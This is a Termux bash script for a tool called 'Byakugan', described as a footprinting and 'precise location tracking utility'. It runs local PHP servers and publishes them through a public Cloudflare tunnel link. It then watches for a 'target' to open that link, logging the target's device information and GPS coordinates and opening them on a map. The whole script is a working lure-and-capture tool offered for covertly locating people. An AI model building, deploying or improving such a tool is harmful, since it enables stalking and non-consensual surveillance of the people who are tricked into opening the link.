#!/data/data/com.termux/files/usr/bin/bash

VERSION="1.0.4"
CWD=$(pwd)

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"
BLINK="\033[5;32m"

cleanup() {
    echo -e "\n${RED}[!] Cleaning up and exiting...${RESET}"
    pkill -f "php -S" >/dev/null 2>&1 &
    pkill -f "cloudflared" >/dev/null 2>&1 &
    rm -rf "$CWD/logs" >/dev/null 2>&1 &
    rm -rf "$CWD/assets/index.html" "$CWD/assets/server.html" > /dev/null 2>&1 &
    exit 0
}

trap cleanup SIGINT

BANNER() {
    clear
    echo -e "${BLUE}"
    figlet -f smslant -w 100 "BYAKUGAN" | while IFS= read -r line; do echo -e "║${WHITE}${line}${BLUE}"; done
    echo -e "╠══════════════════════════════════════════════════════════╣"
    echo -e "║${CYAN}            Footprinting Tool v$VERSION                   ${BLUE}║"
    echo -e "╚══════════════════════════════════════════════════════════╝${RESET}"
    echo -e "${YELLOW}:: ${WHITE}A precise location tracking utility${RESET}"
    echo -e "${YELLOW}:: ${WHITE}Developed by Alienkrishn | Anon4You${RESET}\n"
}

STATUS() {
    local icon="•"
    [ "$1" = "SYSTEM" ] && icon="⚙"
    [ "$1" = "SERVER" ] && icon="🖥"
    [ "$1" = "TUNNEL" ] && icon="🔗"
    [ "$1" = "AUTH" ] && icon="🔒"
    echo -e "${BLUE}[${WHITE}${icon}${BLUE}] ${2}${RESET}"
}

ERROR() {
    echo -e "${RED}[✗] ${1}${RESET}"
    exit 1
}

SUCCESS() {
    echo -e "${GREEN}[✓] ${1}${RESET}"
}

WARNING() {
    echo -e "${YELLOW}[!] ${1}${RESET}"
}

INIT_CHECKS() {
    if ! ping -c 1 google.com >/dev/null 2>&1; then
        ERROR "No internet connection detected!"
    fi

    for cmd in php jq cloudflared xdg-open figlet; do
        if ! command -v $cmd >/dev/null 2>&1; then
            ERROR "Required command '$cmd' not found!"
        fi
    done

    mkdir -p "$CWD"/{logs,send/php} >/dev/null 2>&1
}

MAIN() {
    BANNER
    INIT_CHECKS

    if [ -f "$CWD"/maindb.json ]; then
        uname=$(jq -r '.Login[].username' "$CWD"/maindb.json)
        password=$(jq -r '.Login[].password' "$CWD"/maindb.json)
        STATUS "SYSTEM" "Welcome back, $uname"
    else
        WARNING "First time setup required"
        echo -e -n "${BLUE}[${WHITE}?${BLUE}] ${WHITE}Enter username: ${RESET}"
        read -r uname
        echo -e -n "${BLUE}[${WHITE}?${BLUE}] ${WHITE}Enter password: ${RESET}"
        read -r -s password
        echo
        
        cat <<- EOF > "$CWD"/maindb.json
{
    "Login": [
        {
            "program": "byakugan",
            "author": "Alienkrishn",
            "company": "Anon4You",
            "github": "https://github.com/Anon4You",
            "username": "$uname",
            "password": "$password"
        }
    ]
}
EOF
        SUCCESS "Account created successfully"
    fi

    STATUS "SYSTEM" "Configuring logger..."
    sed -e "s/€UNAME/$uname/g" -e "s/€PASS/$password/g" "$CWD"/assets/logger > "$CWD"/assets/index.html

    rm -f "$CWD"/logs/{phpLogs.txt,phpSend.txt,cloudflared-log.txt} \
          "$CWD"/send/php/{info.txt,result.txt} >/dev/null 2>&1

    STATUS "SERVER" "Starting PHP server on port 8080..."
    cd "$CWD"/send
    php -S 127.0.0.1:8080 >> "$CWD"/logs/phpSend.txt 2>&1 &
    sleep 1

    STATUS "TUNNEL" "Establishing Cloudflare tunnel..."
    cloudflared tunnel -url localhost:8080 --logfile "$CWD"/logs/cloudflared-log.txt > /dev/null 2>&1 &
    sleep 7

    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$CWD"/logs/cloudflared-log.txt | head -n 1)
    if [ -z "$link" ]; then
        ERROR "Failed to establish Cloudflare tunnel"
    fi
    SUCCESS "Tunnel established: $link"

    sed "s|€BYAKUGANLINK|$link|g" "$CWD"/assets/server > "$CWD"/assets/server.html

    STATUS "AUTH" "Starting login portal on port 8084..."
    cd "$CWD/assets"
    php -S 127.0.0.1:8084 >> "$CWD"/logs/phpLogin.txt 2>&1 &
    xdg-open "http://127.0.0.1:8084" >/dev/null 2>&1

    MONITOR() {
        Infos="$CWD/send/php/info.txt"
        Result="$CWD/send/php/result.txt"
        
        echo -e "\n${BLINK}Monitoring for target interaction...${RESET}"
        echo -e "${YELLOW}Press Ctrl+C to stop monitoring${RESET}\n"

        while true; do
            if [[ -f "$Infos" ]]; then
                SUCCESS "Target interaction detected!"
                cat "$Infos" | jq
                cp "$Infos" "$CWD"/info.log
                rm -f "$Infos"
            fi

            if [[ -f "$Result" ]]; then
                lat=$(jq -r '.info[].lat' "$Result")
                lon=$(jq -r '.info[].lon' "$Result")
                map_url="https://maps.google.com/maps?q=$lat,$lon"
                
                SUCCESS "Location captured!"
                echo -e "${WHITE}Coordinates: ${CYAN}$lat, $lon${RESET}"
                echo -e "${WHITE}Map URL: ${BLUE}$map_url${RESET}"
                
                xdg-open "$map_url" >/dev/null 2>&1
                rm -f "$Result"
            fi
            sleep 1
        done
    }

    MONITOR
}

MAIN
